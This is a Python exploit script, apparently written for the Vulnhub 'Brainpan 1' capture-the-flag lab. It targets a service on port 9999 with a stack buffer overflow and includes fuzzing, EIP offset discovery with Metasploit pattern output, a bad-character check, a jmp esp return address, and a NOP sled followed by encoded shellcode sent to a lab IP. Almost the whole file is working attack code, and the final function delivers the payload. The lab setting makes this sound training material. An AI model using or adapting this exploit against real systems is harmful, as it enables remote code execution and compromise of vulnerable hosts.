# coding:utf-8
import socket

"""
详细链接:https://atsud0.github.io/2020/06/25/Vulnhub-brainpan-1/
# /opt/metasploit/tools/exploit/pattern_create.rb -l 600
# Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
# 35724134 > 34 41 72 35 >4 A r 5

$ /opt/metasploit/tools/exploit/pattern_offset.rb -q 35724134 -l 600
[*] Exact match at offset 524


判斷壞字符
\x00

jmp esp

FFE4


"""


def overflow_poc():
    buffer = ["A"]
    counter = 100

    while len(buffer) <= 50:
        buffer.append("A" * counter)
        counter = counter + 100

    for string in buffer:
        print("Fuzzing PASS with {} bytes".format(len(string)))
        s = socket.socket()
        s.connect((host, port))
        s.recv(4096)
        s.send(string)
        s.recv(4096)
        s.close()

def test_eip():
    s = socket.socket()
    #buffer="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"
    buffer="A"*524+"B"*4
    s.connect((host,port))
    s.recv(4096)
    s.send(buffer)
    s.recv(4096)
    s.close()

def poc_edit_esp():
    s = socket.socket()
    buffer = 'A' * 524 + 'B' * 4 + 'C' * (3000 - 524 - 4)
    s.connect((host, port))
    s.recv(4096)
    s.send(buffer.encode('utf-8'))
    s.recv(4096)


def get_bad_char():
    badchars = (
        "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x00"
        "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x10"
        "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x20"
        "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x30"
        "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x40"
        "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x50"
        "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x60"
        "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x70"
        "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x80"
        "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x90"
        "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xa0"
        "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xb0"
        "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xc0"
        "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xd0"
        "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xe0"
        "\xe1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\xf0")


    buffer = "A" * 524 + "B" * 4 + badchars
    s = socket.socket()
    s.connect((host, port))
    s.recv(4096)
    s.send(buffer)
    s.recv(4096)


def shell_code():
    buf = b""
    buf += b"\xd9\xce\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x52\xb8\x3a"
    buf += b"\xeb\x2a\xc9\x31\x46\x17\x83\xc6\x04\x03\x7c\xf8\xc8"
    buf += b"\x3c\x7c\x16\x8e\xbf\x7c\xe7\xef\x36\x99\xd6\x2f\x2c"
    buf += b"\xea\x49\x80\x26\xbe\x65\x6b\x6a\x2a\xfd\x19\xa3\x5d"
    buf += b"\xb6\x94\x95\x50\x47\x84\xe6\xf3\xcb\xd7\x3a\xd3\xf2"
    buf += b"\x17\x4f\x12\x32\x45\xa2\x46\xeb\x01\x11\x76\x98\x5c"
    buf += b"\xaa\xfd\xd2\x71\xaa\xe2\xa3\x70\x9b\xb5\xb8\x2a\x3b"
    buf += b"\x34\x6c\x47\x72\x2e\x71\x62\xcc\xc5\x41\x18\xcf\x0f"
    buf += b"\x98\xe1\x7c\x6e\x14\x10\x7c\xb7\x93\xcb\x0b\xc1\xe7"
    buf += b"\x76\x0c\x16\x95\xac\x99\x8c\x3d\x26\x39\x68\xbf\xeb"
    buf += b"\xdc\xfb\xb3\x40\xaa\xa3\xd7\x57\x7f\xd8\xec\xdc\x7e"
    buf += b"\x0e\x65\xa6\xa4\x8a\x2d\x7c\xc4\x8b\x8b\xd3\xf9\xcb"
    buf += b"\x73\x8b\x5f\x80\x9e\xd8\xed\xcb\xf6\x2d\xdc\xf3\x06"
    buf += b"\x3a\x57\x80\x34\xe5\xc3\x0e\x75\x6e\xca\xc9\x7a\x45"
    buf += b"\xaa\x45\x85\x66\xcb\x4c\x42\x32\x9b\xe6\x63\x3b\x70"
    buf += b"\xf6\x8c\xee\xd7\xa6\x22\x41\x98\x16\x83\x31\x70\x7c"
    buf += b"\x0c\x6d\x60\x7f\xc6\x06\x0b\x7a\x81\xe8\x64\xac\x9d"
    buf += b"\x81\x76\xac\x0c\x0e\xfe\x4a\x44\xbe\x56\xc5\xf1\x27"
    buf += b"\xf3\x9d\x60\xa7\x29\xd8\xa3\x23\xde\x1d\x6d\xc4\xab"
    buf += b"\x0d\x1a\x24\xe6\x6f\x8d\x3b\xdc\x07\x51\xa9\xbb\xd7"
    buf += b"\x1c\xd2\x13\x80\x49\x24\x6a\x44\x64\x1f\xc4\x7a\x75"
    buf += b"\xf9\x2f\x3e\xa2\x3a\xb1\xbf\x27\x06\x95\xaf\xf1\x87"
    buf += b"\x91\x9b\xad\xd1\x4f\x75\x08\x88\x21\x2f\xc2\x67\xe8"
    buf += b"\xa7\x93\x4b\x2b\xb1\x9b\x81\xdd\x5d\x2d\x7c\x98\x62"
    buf += b"\x82\xe8\x2c\x1b\xfe\x88\xd3\xf6\xba\xb9\x99\x5a\xea"
    buf += b"\x51\x44\x0f\xae\x3f\x77\xfa\xed\x39\xf4\x0e\x8e\xbd"
    buf += b"\xe4\x7b\x8b\xfa\xa2\x90\xe1\x93\x46\x96\x56\x93\x42"

    buffer = "A" * 524 + "\xf3\x12\x17\x31" + "\x90"*16 + buf
    s = socket.socket()
    s.connect((host, port))
    s.recv(4096)
    s.send(buffer)
    s.recv(4096)


host = '192.168.40.243'
port = 9999
shell_code()
